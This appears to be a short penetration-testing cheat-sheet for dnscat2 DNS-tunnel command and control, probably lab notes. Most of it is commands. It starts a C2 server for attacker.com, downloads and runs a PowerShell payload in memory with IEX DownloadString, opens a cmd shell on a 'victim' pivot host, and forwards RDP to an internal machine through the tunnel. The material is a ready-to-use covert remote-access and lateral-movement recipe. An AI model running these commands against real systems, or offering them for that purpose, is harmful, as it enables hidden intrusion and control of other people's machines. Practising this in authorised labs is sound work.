Start C2 
```bash
git clone https://github.com/iagox86/dnscat2.git
cd dnscat2/server/
sudo gem install bundler
sudo bundle install

# Start server — replace with your domain and IP
sudo ruby dnscat2.rb --dns host=10.10.14.18,port=53,domain=attacker.com --no-cache
```
Upload binary to target
```bash
git clone https://github.com/lukebaggett/dnscat2-powershell.git

Import-Module .\dnscat2.ps1
```
Linux target
```bash
./dnscat --secret=0ec04a91cd1e963f8c03ca499d589d21 attacker.com
```
Windows target
```bash
# Memory load 
IEX (New-Object System.Net.WebClient).DownloadString('http://10.10.14.18/dnscat2.ps1')

# Establishing C2 connection
Start-Dnscat2 -DNSserver 10.10.14.18 -Domain attacker.com -PreSharedSecret 0ec04a91cd1e963f8c03ca499d589d21 -Exec cmd
```
# Session interaction
```bash
# In dnscat2 console 
dnscat2> windows # list sessions 
dnscat2> window -i 1 # interact with session 1 

# You now have a shell on the pivot 
Microsoft Windows [Version 10.0.18363.1801] 
C:\Users\victim>
```
# Port forwarding + Pivoting
Cannot dynamic pivot with just `dnscat2`, can setup DNS tunneling for other pivot techniques like `ssh` or `http`
```bash
# In the dnscat2 session
dnscat2> listen 127.0.0.1:3389 172.16.5.19:3389

# Now on Kali
xfreerdp /v:127.0.0.1:3389    # hits internal Windows box through DNS tunnel
```